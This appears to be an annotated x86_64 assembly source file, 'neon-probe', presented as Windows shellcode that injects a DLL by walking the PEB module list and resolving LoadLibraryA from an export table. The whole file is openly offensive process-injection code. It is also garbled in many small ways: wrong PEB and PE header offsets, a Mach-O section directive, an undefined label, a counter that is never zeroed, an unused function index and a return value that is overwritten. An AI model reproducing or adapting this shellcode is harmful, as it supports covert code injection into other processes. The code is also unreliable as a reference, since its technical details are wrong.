/* neon-probe: x86_64 shellcode for DLL injection via PEB traversal
 *
 * Entry: RCX = DLL path pointer in target process memory
 * Exit:  RAX = LoadLibraryA return value (HMODULE or NULL)
 *
 * Register map:
 *   r8  = export VA (persistent, never modified after setup)
 *   r9  = names VA (persistent, never modified after setup)
 *   r10 = ordinals VA (persistent, never modified after setup)
 *   r11d = NumberOfNames (loaded once, 32-bit)
 *   r12d = name index counter (32-bit)
 *   rax, rdx = temp
 *   rsi = DLL path (saved from entry)
 *   rbx = saved in prologue, restored in epilogue
 *   rbp = saved in prologue, restored in epilogue
 */

.section __TEXT,__text,regular,pure_instructions

.globl _shellcode_start
_shellcode_start:

    /* ── 0x0000: Prologue ── */
    pushq   %rbp
    movq    %rsp, %rbp
    pushq   %rbx                    # save rbx
    movq    %rcx, %rsi              # save path in rsi

    /* ── 0x000a: Get PEB from fs:[0x30] ── */
    movq    %fs:0x30, %rax          # rax = PEB
    movq    0x18(%rax), %rax        # PEB->Ldr
    movq    0x18(%rax), %rax        # Ldr->InMemoryOrderModuleList
    movq    (%rax), %rax            # first entry (Flink -> self)

    /* ── 0x0022: MODULE LOOP START ── */
    movq    0x20(%rax), %rdi        # rdi = BaseAddress
    testq   %rdi, %rdi
    je      skip_module             # null → skip
    cmpw    $0x5045, 0x36(%rdi)     # compare "PE" at [base+0x36]
    jne     skip_module             # not PE → skip

    /* Get e_lfanew → PE header */
    movl    0x3c(%rdi), %edx
    addq    %rdx, %rdi              # rdi = PE header (at PE signature)

    /* Get Export RVA from PE header (DataDirectory[0] = +0x74 from PE sig) */
    movl    0x74(%rdi), %edx        # Export RVA
    testl   %edx, %edx
    je      skip_module             # no export → skip
    addq    %rdx, %rdi              # rdi = export VA

    /* ── 0x003c: Setup persistent export table pointers ── */
    movq    %rdi, %r8               # r8 = export VA (PERSISTENT)
    movl    0x18(%r8), %edx         # edx = NumberOfNames
    testl   %edx, %edx
    je      skip_module             # no names → skip
    movl    %edx, %r11d             # r11d = NumberOfNames

    leaq    0x20(%r8), %rax         # rax = address to load from
    movl    (%rax), %edx            # edx = Names RVA
    leaq    (%r8, %rdx), %r9        # r9 = names VA (r8 untouched)

    leaq    0x24(%r8), %rax         # rax = address to load from
    movl    (%rax), %edx            # edx = Ordinals RVA
    leaq    (%r8, %rdx), %r10       # r10 = ordinals VA (r8 untouched)

    /* ── 0x0058: NAME LOOP START ── */
    xorl    $0, %r12d               # r12d = 0 (name index)

name_loop:
    movl    (%r9, %r12, 4), %edx    # edx = names[name_idx] (RVA)
    leaq    (%r9, %rdx), %rax       # rax = name VA (temp)

    /* Compare name with "LoadLibraryA" (12 bytes) */
    /* Bytes 0-3: "Load" = LE 0x64616f4c */
    cmpl    $0x64616f4c, (%rax)
    jne     next_name

    /* Bytes 4-7: "Libr" = LE 0x7262694c */
    cmpl    $0x7262694c, 4(%rax)
    jne     next_name

    /* Bytes 8-11: "aryA" = LE 0x41797261 */
    cmpl    $0x41797261, 8(%rax)
    jne     next_name

    /* ── 0x006e: Found! Resolve function ── */

    /* Get ordinal from ordinals table */
    movzwl  (%r10, %r12, 2), %edx  # edx = ordinals[name_idx] (WORD)
    movl    %edx, %eax              # eax = ordinal
    movl    0x10(%r8), %edx         # edx = OrdinalBase
    subl    %edx, %eax              # eax = function index

    /* Get function RVA from functions table (export+0x1c) */
    movl    0x1c(%r8), %edx         # edx = Functions RVA
    leaq    (%r8, %rdx), %rax       # rax = function pointer VA
    call    *(%rax)                 # indirect call through memory: LoadLibraryA(path)
    jmp     done

next_name:
    /* Next name */
    incl    %r12d                   # name_idx++
    cmpl    %r11d, %r12d            # name_idx < nNames?
    jl      name_loop               # continue loop

    /* ── 0x0086: Done (not found) ── */
done:
    xorl    %eax, %eax              # return 0 (failure)

    /* ── 0x0088: Epilogue ── */
    popq    %rbx                    # restore rbx
    popq    %rbp                    # restore rbp
    ret

_shellcode_start_end:
